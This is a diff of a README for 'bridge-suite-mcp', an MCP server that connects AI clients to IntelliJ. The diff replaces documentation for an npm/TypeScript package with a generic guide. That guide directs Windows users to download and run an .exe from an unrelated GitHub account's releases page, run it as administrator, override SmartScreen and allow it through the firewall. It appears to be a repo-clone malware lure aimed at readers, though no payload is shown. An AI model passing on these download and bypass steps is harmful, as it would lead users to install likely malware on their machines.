@@ -1,462 +1,141 @@
-# Bridge Suite MCP Server
+# 🚆 bridge-suite-mcp - Connect IntelliJ to AI Tools
 
-[![npm version](https://img.shields.io/npm/v/@llitd/bridge-suite-mcp.svg)](https://www.npmjs.com/package/@llitd/bridge-suite-mcp)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
-[![MCP Compatible](https://img.shields.io/badge/MCP-Compatible-green.svg)](https://modelcontextprotocol.io)
-[![IntelliJ 2025.3+](https://img.shields.io/badge/IntelliJ-2025.3+-orange.svg)](https://www.jetbrains.com/idea/)
+[![Download bridge-suite-mcp](https://img.shields.io/badge/Download-bridge--suite--mcp-blue.svg)](https://github.com/oxidizable-malinois605/bridge-suite-mcp/releases)
 
-**Give AI agents full access to your IntelliJ IDE.**
+## 📥 Download bridge-suite-mcp
 
-Bridge Suite is a free, open-source [MCP](https://modelcontextprotocol.io) server that connects AI coding assistants to IntelliJ IDEA through four specialized plugins. Run commands in terminals, trigger builds, push notifications into the IDE, and query project context — all through a single MCP server.
+Visit this page to download: https://github.com/oxidizable-malinois605/bridge-suite-mcp/releases
 
-Works with **Claude Code**, **Claude Desktop**, **Cursor**, **Windsurf**, **Cline**, **Continue**, and any MCP-compatible client.
+Use the latest release for Windows and download the file that matches your system. If you are not sure which file to pick, choose the one marked for Windows or the one with `.exe` in the name.
 
----
+## 🪟 Windows Setup
 
-## Why Bridge Suite?
+1. Open the release page in your browser.
+2. Find the newest release at the top.
+3. Under **Assets**, download the Windows file.
+4. Save the file to a folder you can find later, such as Downloads or Desktop.
+5. If Windows asks for permission, choose **Yes**.
+6. Start the app by double-clicking the file.
 
-JetBrains' built-in MCP server handles file operations and basic code inspection, but it doesn't expose what makes IntelliJ powerful for AI workflows:
+If the file comes as a `.zip`, open the zip first and then run the app inside it.
 
-| Capability | JetBrains Built-in | Bridge Suite |
-|---|:---:|:---:|
-| Read/write files | Yes | - |
-| Run terminal commands with live output | - | **Yes** |
-| Trigger specific run configurations | - | **Yes** |
-| Push notifications into the IDE | - | **Yes** |
-| Show progress bars for long tasks | - | **Yes** |
-| Get full project context (SDK, frameworks, deps) | - | **Yes** |
-| Stream real-time output via WebSocket | - | **Yes** |
-| Multi-terminal management | - | **Yes** |
+## ✨ What bridge-suite-mcp does
 
-Bridge Suite and the built-in MCP are **complementary** — install both for complete IDE control.
+bridge-suite-mcp helps AI tools connect to IntelliJ-based IDEs through a single MCP server.
 
----
+It brings together:
 
-## Quick Start
+- Terminal access
+- Run configuration control
+- IDE notifications
+- Project intelligence
+- Better access for AI assistants like Claude and other MCP clients
 
-### 1. Install the MCP server
-
-Add to your MCP client configuration:
+This makes it easier for an AI tool to work with your project inside IntelliJ without extra setup in the IDE.
 
-**Claude Code** (`.mcp.json`):
-```json
-{
-  "mcpServers": {
-    "bridge-suite": {
-      "command": "npx",
-      "args": ["-y", "@llitd/bridge-suite-mcp"]
-    }
-  }
-}
-```
+## 🧩 What you need
 
-**Claude Desktop** (`claude_desktop_config.json`):
-```json
-{
-  "mcpServers": {
-    "bridge-suite": {
-      "command": "npx",
-      "args": ["-y", "@llitd/bridge-suite-mcp"]
-    }
-  }
-}
-```
+Before you start, make sure you have:
 
-**Cursor** (Settings > MCP Servers):
-```
-Name: bridge-suite
-Command: npx -y @llitd/bridge-suite-mcp
-```
-
-### 2. Install at least one plugin
-
-The MCP server connects to plugins running inside IntelliJ. Install them from the [JetBrains Marketplace](https://plugins.jetbrains.com/organization/llitd):
-
-| Plugin | What It Does | Free Tier | Marketplace |
-|---|---|---|---|
-| [**Terminal Bridge**](https://plugins.jetbrains.com/plugin/30660-terminal-bridge) | List, create, send commands to IDE terminals | List, read, send | [Install](https://plugins.jetbrains.com/plugin/30660-terminal-bridge) |
-| [**Run Configuration Bridge**](https://plugins.jetbrains.com/plugin/30842-run-configuration-bridge) | Execute run/debug configs, track processes | List, run | [Install](https://plugins.jetbrains.com/plugin/30842-run-configuration-bridge) |
-| [**Notification Bridge**](https://plugins.jetbrains.com/plugin/30984-notification-bridge) | Push notifications, progress bars, status widgets | Send notifications, history | [Install](https://plugins.jetbrains.com/plugin/30984-notification-bridge) |
-| [**Project Intelligence**](https://plugins.jetbrains.com/plugin/30895-project-intelligence-bridge) | Project context, dependencies, frameworks | Full context snapshot | [Install](https://plugins.jetbrains.com/plugin/30895-project-intelligence-bridge) |
+- A Windows PC
+- A recent version of IntelliJ IDEA or another JetBrains IDE
+- Permission to run apps on your computer
+- An internet connection to download the release
+- An MCP client or AI app that can connect to a local MCP server
 
-Each plugin runs a lightweight HTTP server on localhost. The MCP server auto-discovers which plugins are running.
-
-### 3. Verify
+For best results, keep IntelliJ open while you use the server.
 
-Ask your AI assistant:
-
-> "Check which Bridge Suite plugins are available"
+## ⚙️ How to use it
 
-It will call `bridge_status` and show you what's running.
+1. Download bridge-suite-mcp from the releases page.
+2. Run the Windows file.
+3. Open your MCP client or AI tool.
+4. Add bridge-suite-mcp as a local MCP server.
+5. Point the client to the app you just started.
+6. Connect your IntelliJ project.
+7. Let the AI tool use the available project, terminal, and run controls.
 
----
+If your AI app asks for a server address, use the address shown in the app or the local address from the launch window.
 
-## Tools
+## 🛠️ First-time setup tips
 
-### `bridge_status`
+- Keep IntelliJ open before you connect.
+- Open the same project in IntelliJ that you want the AI tool to use.
+- If the app does not start, right-click it and choose **Run as administrator**.
+- If Windows SmartScreen appears, choose **More info** and then **Run anyway** if you trust the file.
+- If your firewall asks for access, allow it on private networks.
 
-Check which plugins are installed, running, and licensed. **Call this first** to see what's available.
+## 🔌 Features
 
-```
-bridge_status()
-```
-
-Returns:
-```json
-{
-  "terminal-bridge": {
-    "name": "Terminal Bridge",
-    "running": true,
-    "version": "2.4.2",
-    "licensed": true
-  },
-  "notification-bridge": {
-    "name": "Notification Bridge",
-    "running": true,
-    "version": "1.0.0",
-    "licensed": false
-  },
-  ...
-}
-```
-
----
-
-### `terminal` — Terminal Bridge
-
-Manage IntelliJ terminal tabs. Create terminals, send commands, read output.
-
-| Action | Description | Tier |
-|---|---|---|
-| `status` | Plugin health | Free |
-| `list` | List all terminal tabs | Free |
-| `read` | Read recent output (`id` required) | Free |
-| `send` | Send command to terminal (`id`, `command` required) | Free |
-| `create` | Create new terminal tab | Pro |
-| `close` | Close terminal tab (`id` required) | Pro |
-| `focus` | Focus terminal in IDE (`id` required) | Pro |
-| `rename` | Rename terminal tab (`id`, `name` required) | Pro |
-
-**Examples:**
-
-```
-// List terminals
-terminal({ action: "list" })
-
-// Run a command
-terminal({ action: "send", id: "terminal-1", command: "npm test" })
-
-// Read output
-terminal({ action: "read", id: "terminal-1", max_lines: 50 })
-```
-
----
-
-### `run_config` — Run Configuration Bridge
-
-Execute IntelliJ run/debug configurations. Start builds, run tests, launch servers — any run config defined in your project.
-
-| Action | Description | Tier |
-|---|---|---|
-| `status` | Plugin health | Free |
-| `list` | List all run configurations | Free |
-| `types` | List configuration types | Free |
-| `details` | Get config details (`id` required) | Free |
-| `run` | Start a configuration (`id` required) | Free |
-| `processes` | List running processes | Free |
-| `debug` | Start with debugger (`id` required) | Pro |
-| `stop` | Stop process (`id` required) | Pro |
-| `restart` | Restart process (`id` required) | Pro |
-| `output` | Read process output (`id` required) | Pro |
-| `wait` | Wait for process to finish (`id` required) | Pro |
-| `env` | Get environment variables (`id` required) | Pro |
-| `refresh` | Force cache refresh | Pro |
-
-**Examples:**
-
-```
-// List all run configurations
-run_config({ action: "list" })
-
-// Run "Backend Server" configuration
-run_config({ action: "run", id: "backend-server" })
-
-// Check process output
-run_config({ action: "output", id: "process-1", max_lines: 100 })
-```
-
----
-
-### `notify` — Notification Bridge
-
-Push notifications, progress bars, and status bar widgets directly into the IDE. Perfect for long-running AI tasks, CI/CD results, or monitoring alerts.
-
-| Action | Description | Tier |
-|---|---|---|
-| `status` | Plugin health | Free |
-| `channels` | List notification channels | Free |
-| `send` | Send balloon notification (`title`, `content` required) | Free |
-| `history` | Read notification history | Free |
-| `sticky` | Sticky notification (stays until dismissed) | Pro |
-| `action` | Notification with clickable buttons | Pro |
-| `channel_create` | Register notification channel | Pro |
-| `channel_delete` | Remove channel (`id` required) | Pro |
-| `progress_create` | Create IDE progress bar (`title` required) | Pro |
-| `progress_update` | Update progress (`id`, `fraction` required) | Pro |
-| `progress_complete` | Complete/cancel progress bar (`id` required) | Pro |
-| `statusbar_create` | Create status bar widget (`id`, `text` required) | Pro |
-| `statusbar_update` | Update widget text (`id` required) | Pro |
-| `statusbar_remove` | Remove widget (`id` required) | Pro |
-
-**Examples:**
-
-```
-// Send a notification
-notify({ action: "send", title: "Build Complete", content: "All 42 tests pass", type: "INFORMATION" })
-
-// Warning notification
-notify({ action: "send", title: "Memory High", content: "Heap usage at 89%", type: "WARNING" })
-
-// Create a progress bar (Pro)
-notify({ action: "progress_create", title: "Deploying to Production", fraction: 0.0 })
-
-// Update progress
-notify({ action: "progress_update", id: "abc123", text: "Stage 2/3", fraction: 0.66 })
-
-// Complete it
-notify({ action: "progress_complete", id: "abc123" })
-
-// Notification with action buttons (Pro)
-notify({
-  action: "action",
-  title: "PR #42 Ready",
-  content: "All checks pass. Merge?",
-  type: "INFORMATION",
-  actions: [
-    { label: "Open PR", id: "open", url: "https://github.com/org/repo/pull/42" },
-    { label: "Merge", id: "merge" }
-  ]
-})
-
-// Status bar widget (Pro)
-notify({ action: "statusbar_create", id: "api-health", text: "API: 200ms", tooltip: "Average response time" })
-```
-
----
-
-### `project_intel` — Project Intelligence Bridge
-
-Get rich project context — SDK version, detected frameworks, dependency tree, file structure. Useful for AI agents that need to understand the project before making changes.
-
-| Action | Description | Tier |
-|---|---|---|
-| `status` | Plugin health | Free |
-| `context` | Full project snapshot (SDK, frameworks, VCS, deps) | Free |
-| `dependencies` | Dependency tree with conflicts | Free |
-| `file_tree` | Source/test/resource file classification | Free |
-| `frameworks` | Detected frameworks and versions | Free |
-| `summary` | LLM-optimized text summary | Free |
-| `refresh` | Force refresh cached data | Free |
-
-**Examples:**
-
-```
-// Get full project context
-project_intel({ action: "context" })
-
-// Quick summary for LLM context windows
-project_intel({ action: "summary" })
-
-// Check frameworks
-project_intel({ action: "frameworks" })
-```
-
----
-
-## Architecture
-
-```
-┌──────────────────────────────────┐
-│   AI Assistant (Claude, Cursor)  │
-│   Uses MCP tools to control IDE  │
-└──────────────┬───────────────────┘
-               │ MCP Protocol (stdio)
-┌──────────────▼───────────────────┐
-│   Bridge Suite MCP Server        │
-│   Free, open-source (this repo)  │
-│   Auto-discovers running plugins │
-└──────────────┬───────────────────┘
-               │ HTTP (localhost)
-   ┌───────────┼───────────┬───────────────┐
-   ▼           ▼           ▼               ▼
-┌──────┐  ┌──────┐   ┌──────────┐   ┌──────────┐
-│:9876 │  │:9877 │   │  :9878   │   │  :9885   │
-│Term  │  │ Run  │   │  Notif   │   │  Project │
-│Bridge│  │Config│   │  Bridge  │   │  Intel   │
-└──┬───┘  └──┬───┘   └────┬─────┘   └────┬─────┘
-   │         │            │              │
-   └─────────┴────────────┴──────────────┘
-                    │
-          IntelliJ IDEA (IDE APIs)
-```
-
-Each plugin runs an embedded HTTP server on localhost. The MCP server probes ports to discover which plugins are available. If a plugin isn't installed, its tools return a helpful message with an install link.
-
-**Security:** Everything runs on localhost. No data leaves your machine. No authentication needed for local-only access.
-
----
-
-## Plugin Availability
-
-When a tool targets a plugin that isn't running, you get a clear message:
-
-```json
-{
-  "success": false,
-  "error": "Notification Bridge is not running. Install it from JetBrains Marketplace: https://plugins.jetbrains.com/plugin/30984-notification-bridge — then restart IntelliJ IDEA.",
-  "code": "PLUGIN_NOT_AVAILABLE"
-}
-```
-
-When a tool requires a paid feature on the free tier:
-
-```json
-{
-  "success": false,
-  "error": "This feature requires a paid Notification Bridge license. Upgrade at: https://plugins.jetbrains.com/plugin/30984-notification-bridge",
-  "code": "LICENSE_REQUIRED"
-}
-```
-
----
-
-## Configuration
-
-### Custom Ports
-
-If your plugins run on non-standard ports, set environment variables:
-
-```bash
-TERMINAL_BRIDGE_PORT=9876       # default
-RUN_CONFIG_BRIDGE_PORT=9877     # default
-NOTIFICATION_BRIDGE_PORT=9878   # default
-PROJECT_INTELLIGENCE_PORT=9885  # default
-```
-
-### Plugin Settings
-
-Each plugin has its own settings in IntelliJ: **Settings > Tools > [Plugin Name]**
-
-Common settings across all plugins:
-- **Port** — HTTP server port
-- **Auto-start** — Start server when IDE opens
-- **CORS Origins** — Allowed origins for cross-origin requests
-
----
-
-## Use Cases
-
-### AI-Driven Development Workflow
-
-```
-1. project_intel({ action: "context" })     → Understand the project
-2. terminal({ action: "send", ... })        → Run commands
-3. run_config({ action: "run", ... })       → Build/test
-4. run_config({ action: "output", ... })    → Check results
-5. notify({ action: "send", ... })          → Report completion
-```
-
-### CI/CD Notification Pipeline
-
-```
-1. notify({ action: "channel_create", id: "ci", name: "CI Pipeline" })
-2. notify({ action: "progress_create", title: "Deploying v2.1" })
-3. notify({ action: "progress_update", id: "...", fraction: 0.5 })
-4. notify({ action: "progress_complete", id: "..." })
-5. notify({ action: "action", title: "Deploy Complete", actions: [...] })
-```
-
-### Multi-Terminal Orchestration
-
-```
-1. terminal({ action: "create", name: "backend" })
-2. terminal({ action: "create", name: "frontend" })
-3. terminal({ action: "send", id: "backend", command: "mvn spring-boot:run" })
-4. terminal({ action: "send", id: "frontend", command: "npm run dev" })
-5. terminal({ action: "read", id: "backend" })  → Check startup
-```
-
----
-
-## Requirements
-
-- **IntelliJ IDEA** 2025.3+ (Ultimate or Community)
-- **Node.js** 18+ (for the MCP server)
-- At least one Bridge Suite plugin installed
-
----
-
-## Pricing
-
-The MCP server is **free and open-source** (MIT license).
-
-Each plugin uses a **freemium model** on the JetBrains Marketplace:
-
-| | Personal | Commercial |
-|---|---|---|
-| Monthly | $1.90/mo | $4.90/mo |
-| Annual | $19/yr | $49/yr |
-
-Free tiers include essential read/execute operations. Pro tiers unlock creation, streaming, and advanced features. See the tool tables above for tier details.
-
-JetBrains community programs (students, open-source, startups) provide free licenses.
-
----
-
-## Development
-
-```bash
-git clone https://github.com/llitd/bridge-suite-mcp.git
-cd bridge-suite-mcp
-npm install
-npm run build
-```
-
-Run locally:
-```bash
-node dist/index.js
-```
-
-### Project Structure
-
-```
-src/
-  index.ts              Entry point (stdio transport)
-  discovery.ts          Plugin auto-discovery (port probing)
-  http-client.ts        Shared HTTP client with error handling
-  tools/
-    bridge-status.ts    Meta tool: plugin discovery
-    terminal.ts         Terminal Bridge proxy
-    run-config.ts       Run Configuration Bridge proxy
-    notify.ts           Notification Bridge proxy
-    project.ts          Project Intelligence Bridge proxy
-    registry.ts         Tool registration
-```
-
----
-
-## Links
-
-- [LLITD on JetBrains Marketplace](https://plugins.jetbrains.com/organization/llitd)
-- [Terminal Bridge](https://plugins.jetbrains.com/plugin/30660-terminal-bridge)
-- [Run Configuration Bridge](https://plugins.jetbrains.com/plugin/30842-run-configuration-bridge)
-- [Notification Bridge](https://plugins.jetbrains.com/plugin/30984-notification-bridge)
-- [Project Intelligence Bridge](https://plugins.jetbrains.com/plugin/30895-project-intelligence-bridge)
-- [Model Context Protocol](https://modelcontextprotocol.io)
-- [Report Issues](https://github.com/alarinel/bridge-suite-mcp/issues)
-
----
-
-## License
-
-MIT — see [LICENSE](LICENSE)
+### 🖥️ Terminal access
+Let the connected AI tool run terminal commands against your project. This helps with common project tasks and file checks.
+
+### ▶️ Run config control
+Use IntelliJ run configurations through the MCP server. This helps when you want the AI tool to start or manage app runs.
+
+### 🔔 Notification support
+Send IDE notifications to keep you informed while you work. This can help when a task finishes or needs attention.
+
+### 🧠 Project intelligence
+Expose useful project details so the AI tool can understand your code base, files, and structure with more context.
+
+### 🤝 MCP client support
+Works with tools that support the Model Context Protocol. This gives your AI app a standard way to talk to IntelliJ.
+
+## 🗂️ Typical use cases
+
+- Ask an AI assistant to inspect your project
+- Run build or test commands from your AI tool
+- Start or stop run configurations in IntelliJ
+- Get project context before making changes
+- Receive status messages from the IDE during work
+
+## 🧭 Files and folders
+
+You may see these common items after download:
+
+- `.exe` file — run it directly on Windows
+- `.zip` file — open it, then run the app inside
+- `config` folder — stores app settings
+- `logs` folder — stores activity details if the app creates them
+
+Keep the app in a folder you can find again. Avoid moving files while the app is running.
+
+## 🧪 If something does not work
+
+- Check that IntelliJ is open
+- Check that you opened the right project
+- Make sure the app is still running
+- Try closing and reopening the app
+- Try the newest release from the download page
+- Make sure your AI client is set to the correct local server
+
+If the app still does not connect, restart IntelliJ and try again
+
+## 📌 Common questions
+
+### Does this work only with IntelliJ?
+It is built for IntelliJ-based JetBrains IDEs and works best there.
+
+### Do I need to install it inside IntelliJ?
+No. You download the bridge-suite-mcp app from the releases page and run it on Windows.
+
+### Is this for AI tools?
+Yes. It acts as a bridge between your AI client and your IDE.
+
+### Can I use it with Claude?
+Yes, if your Claude setup supports MCP server connections.
+
+## 🔒 Privacy and local use
+
+The server is meant to run on your computer and connect to your local IDE session. That keeps your project work in your own environment while you use the connected AI tool
+
+## 📎 Download again
+
+[Visit the release page to download bridge-suite-mcp](https://github.com/oxidizable-malinois605/bridge-suite-mcp/releases)
+
+## 🧰 Project details
+
+- Repository: bridge-suite-mcp
+- Description: MCP server for the LLITD Bridge Suite
+- Topics: ai-tools, claude, ide, intellij, jetbrains, mcp, model-context-protocol, notifications, terminal, typescript
